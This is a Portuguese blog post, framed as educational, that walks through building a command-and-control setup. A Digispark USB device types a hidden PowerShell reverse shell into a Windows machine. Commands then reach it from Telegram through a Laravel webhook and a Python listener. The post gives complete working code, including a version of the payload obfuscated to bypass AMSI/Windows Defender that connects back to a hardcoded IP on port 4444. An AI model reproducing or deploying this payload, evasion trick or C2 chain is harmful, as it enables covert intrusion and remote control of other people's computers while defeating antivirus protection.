---
title: Hack Once Control Anywhere
date: 2024-03-01 16:00:00 -0300
categories: [ESTUDO, C2]
tags: [C2, SHELL REVERSO] # TAG names should always be lowercase
---

## Motivação

Há pouco mais de um ano, tive uma conversa despretensiosa com meu amigo Leonardo Toledo, que, até então, eu sabia que trabalhava com BI. Surpreendentemente, ele compartilhou que havia migrado para a área de cyber security, integrando uma equipe de Red Team. Em outras palavras, Leonardo havia abandonado os gráficos, cubos e KPI's e se tornado um hacker e como não há uma só pessoa apaixonada por tecnologia que não se encante por esse assunto, comigo não foi diferente.

Essa conversa não apenas se estendeu por alguns dias, mas também evoluiu, levando-o a me convidar para participar de um grupo de amigos focados em segurança da informação. Com o tempo, minha envolvência com o grupo cresceu, fiz e estou fazendo cursos na área de segurança e resultado disso é que hoje estou publicando meu primeiro texto sobre segurança da informação.

## Introdução

Este projeto visa criar uma estrutura C2 completa, permitindo, a partir de um agente, infectar uma máquina Windows e estabelecer um shell reverso para um servidor, controlável de qualquer dispositivo.

![img-description](/img/202403011605.jpg)
_Diagrama C2_

Embora totalmente funcional, este C2 é simplificado, visando propósitos educacionais e quem sabe, despertar em alguém o interesse pelo tema.

## Tecnologias utilizadas

A confluência de hardware, software e plataformas de comunicação é o que torna possível esse projeto C2.

**- Digispark Attiny85:** Atua como o agente infeccioso, sendo inserido na porta USB da máquina-alvo por um usuário infiltrado ou desavisado. Este dispositivo é uma microcontroladora baseada em Arduino, notável por seu tamanho reduzido e flexibilidade.

**- IDE do Arduino:** Ferramenta para criar e carregar o código malicioso na Digispark, um ambiente de desenvolvimento para programar dispositivos baseados em Arduino.

**- VirtualBox com Windows 10 Pro:** Utilizamos uma máquina virtual Windows para simular ambientes de ataque e desenvolvimento de estratégias de C2 em um ambiente seguro.

**- Laravel 9:** Integra as APIs do Telegram com o servidor Linux, um framework PHP conhecido por sua simplicidade e robustez.

**- Python 3:** Responsável por criar uma conexão semelhante ao Netcat, ouvindo uma porta específica na VPS Linux para receber o shell reverso e transmitir comandos para a máquina infectada.

**- VPS Linux:** Hospeda as aplicações Laravel e Python, oferecendo um ambiente estável e seguro para o funcionamento do sistema C2.

**- Telegram:** A interface que permite ao hacker iniciar ataques de qualquer lugar, oferecendo uma plataforma segura e fácil de usar para o envio de comandos.

## Hardware Hacking

A Digispark é a agente infiltrada, a nossa Mata Hari, ela é quem se arrisca, avançando silenciosamente para abrir caminho para operações subversivas. A sua capacidade de ser programada para executar desde simples automações até a execução de payloads complexos foi determinante na sua escolha.

![img-description](/img/202403011618.png)
_Digispark Attiny85_

Quando plugada na porta USB do computador, a Digispark se comporta como um teclado e executa os comandos que nela foram programados. O código malicioso utilizado, foi adquirido no repositório do GitHub MTK911/Attiny85 e entre os diversos que ele possui, o "Instant Shell" foi o escolhido, pois nos testes realizados, ele se mostrou muito eficiente na criação do shell reverso na máquina infectada.

Porém, a vida é cheia de surpresas, reviravoltas e em uma das tantas atualizações do Windows, o payload parou de funcionar me forçando a encarar uma jornada para identificar e corrigir o problema. E foi aí que conheci a AMSI (Antimalware Scan Interface).

A AMSI é uma interface na qual aplicativos ou serviços (incluindo terceiros) são capazes de verificar o conteúdo de um script em busca de uso malicioso. Se uma assinatura no script for registrada pelo provedor de serviços antimalware AMSI (Windows Defender por padrão), ela será bloqueada.

E foi exatamente isso o que estava acontecendo, a AMSI estava identificando o meu payload como malicioso e impedindo o seu funcionamento, porém, por incrivel que pareça é muito fácil dar o Bypass na AMSI e através de um pouco de esforço eu consegui chegar em um script que fosse capaz de normalizar a execução do nosso shell reverso.

A seguir vou mostrar o código original e o código alterado e embora a diferença entre eles seja ridícula, ela é suficinte para enganar a sua assinatura maliciosa.

#### Código Original

```c
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("cmd");//run cmd

  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
```

#### Código Modificado

```c
#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A
}
void loop() {
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(500);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("powershell -noexit -command \"mode con cols=18 lines=1\"");//start tiny PowerShell
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(5000);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(2000);
  DigiKeyboard.println("cmd");//run cmd
  DigiKeyboard.delay(2000);
  DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = N'ew'-Ob'j'ect Sy's'tem.Net.Sockets.TCPClient('93.188.166.167',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker
  DigiKeyboard.delay(5000);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(5000);
}
```

#### O Bypass

```c
# Original
DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker

# Modificado
DigiKeyboard.println(F("powershell -windowstyle hidden -command \"$client = N'ew'-Ob'j'ect Sy's'tem.Net.Sockets.TCPClient('93.188.166.167',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"")); //powershell to attacker
```

## Telegram

Integrar o Telegram ao projeto foi, surpreendentemente, uma das etapas mais simples, graças ao pouco de experiência que eu tenho com Laravel e à descoberta da biblioteca TelegramBot, que simplificou ainda mais o processo.

Para manter o foco deste artigo, presumirei que você já possui um ambiente configurado com Laravel 9, PHP 8.1 e Apache2 em uma máquina Linux (utilizei Ubuntu 22.04) com suporte a HTTPS e acesso externo. Portanto, não detalharei a instalação e configuração dessas tecnologias, focando diretamente na integração com o Telegram.

#### Criando um Bot no Telegram

O primeiro passo para integrar o Telegram ao sistema C2 envolve a criação de um bot. Isso é feito através do BotFather no Telegram, que nada mais é do que um bot que cria bots. A busca por "BotFather" na barra de pesquisas do Telegram nos leva diretamente a ele. Após a criação do bot, um TOKEN é fornecido e é através dele que a integração acontecerá.

**- Acesso ao BotFather:** No Telegram, utilize a barra de pesquisa para localizar o BotFather. Ele é o bot oficial do Telegram para a criação e gerenciamento de outros bots.

**- Criação do Bot:** Siga as instruções fornecidas pelo BotFather para criar seu novo bot. O processo é intuitivo, envolvendo a definição de um nome e um username para o bot.

**- Obtenção do TOKEN:** Ao final do processo de criação, o BotFather fornecerá um TOKEN único. Esse TOKEN é essencial para a integração, permitindo que o nosso sistema C2 se comunique com o bot criado.

![img-description](/img/202403011845.png)
_BotFather_

Com o TOKEN do Telegram em mãos, desenvolvi o seguinte script PHP para integrar o bot ao nosso sistema C2. Este código é responsável por configurar o webhook do Telegram e processar as mensagens recebidas, seguindo a lógica de controle de acesso e execução de comandos.

```php
<?php

namespace App\Http\Controllers;

use App\Classes\Mensagem;
use Illuminate\Http\Request;
use TelegramBot\Api\BotApi;

class HomeController extends Controller
{
    public function config(Request $request)
    {
        $bot = new BotApi(config("app.TELEGRAM_TOKEN"));
        $bot->setWebhook(config("app.TELEGRAM_WEBHOOK"));
    }

    public function webhook(Request $request)
    {
        try {
            $data = $request->all();

            $bot = new BotApi(config("app.TELEGRAM_TOKEN"));

            if ($data["message"]["from"]["username"] == config("app.TELEGRAM_USER")) {
                $bot->sendMessage($data["message"]["from"]["id"], sprintf("Olá %s, ataque iniciado - %s",
                $data["message"]["from"]["first_name"], $data["message"]["text"]));

                $nomeDoArquivo = "/var/www/html/arquivo.txt";

                if (file_exists($nomeDoArquivo)) {
                    unlink($nomeDoArquivo);
                }

                file_put_contents($nomeDoArquivo, strtolower(trim($data["message"]["text"])));
            }
            else {
                $nome = isset($data["message"]["from"]["first_name"]) ? $data["message"]["from"]["first_name"] : "amigo(a)";
                $bot->sendMessage($data["message"]["from"]["id"], sprintf("Olá %s, acesso negado!", $nome));
            }
        } catch (\Throwable $th) {
            $bot->sendMessage(config("app.TELEGRAM_FROM_ID"), $th->getMessage());
        }

        return response()->json([], "200");
    }
}
```

#### Funcionamento do Código

**- Configuração do Webhook:** A primeira rota (config) é utilizada para configurar a URL do webhook no Telegram, ela garante que qualquer mensagem enviada ao bot seja retransmitida para o webhook.

**- Processamento das Mensagens:** O método webhook é onde a interação acontece. Ele segue a seguinte lógica:

- Verifica a autenticidade do usuário que enviou a mensagem, comparando com um usuário autorizado definido no arquivo .env.
- Caso o usuário não seja autorizado, uma mensagem de "acesso negado" é enviada de volta para o usuário do Telegram.
- Se autorizado, o script prossegue para verificar a existência do arquivo /var/www/html/arquivo.txt, removendo-o se já existir, para evitar conflitos de comando.
- Por fim, o conteúdo da mensagem, que representa o comando a ser executado, é salvo no arquivo mencionado.

Este método nada ortodoxo, estabelece uma ponte para a comunicação entre o PHP e o Python, que será detalhada a seguir.

## A cobra vai fumar

Na última parte e não menos importante, temos o Python desempenhando o papel de escutar uma porta específica na VPS Linux para o recebimento do shell reverso, além de monitorar a recepção dos comandos do Telegram que serão executados na máquina infectada.

```python
import socket
import time
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import time
import os

host = '0.0.0.0'
port = 4444

caminho_para_monitorar = "/var/www/html"
nome_arquivo = "arquivo.txt"
caminho_completo = caminho_para_monitorar +"/" +nome_arquivo;

class MeuHandler(FileSystemEventHandler):
    def on_created(self, event):
        if nome_arquivo in event.src_path:
            if os.path.exists(caminho_completo):
                with open(caminho_completo, 'r') as arquivo:
                    conteudo = arquivo.read()
                    enviar_mensagem(conteudo)
                    time.sleep(2)
                    os.remove(caminho_completo)

def enviar_mensagem(mensagem):
    global client_socket
    if client_socket:
        client_socket.sendall(mensagem.encode('utf-8'))

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((host, port))
server_socket.listen()

print(f"Servidor escutando em {host}:{port}...")
print(f"Monitorando a criação de {nome_arquivo} em {caminho_para_monitorar}.")

client_socket, address = server_socket.accept()
print(f"Conexão de {address} estabelecida.")

event_handler = MeuHandler()
observer = Observer()
observer.schedule(event_handler, path=caminho_para_monitorar, recursive=False)
observer.start()

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    observer.stop()

observer.join()
client_socket.close()
server_socket.close()
```

#### Funcionamento do Código

**- Escuta de Porta:** Semelhante ao netcat, o script espera conexões na porta especificada, pronta para receber o shell reverso da máquina infectada.

**- Monitoramento de Arquivo:** Utilizanado a biblioteca watchdog para monitorar a criação de um arquivo específico (arquivo.txt), indicando a recepção de novos comandos via Telegram.

**- Execução de Comandos:** Ao detectar a criação do arquivo, lê seu conteúdo e envia os comandos para a máquina infectada, permitindo o controle remoto da mesma.

Este script descreve um método eficaz de interação entre componentes do sistema C2, facilitando a execução remota de comandos na máquina alvo. A simplicidade e eficácia do código Python aqui apresentado são vitais para o sucesso do projeto.

## Et voilá
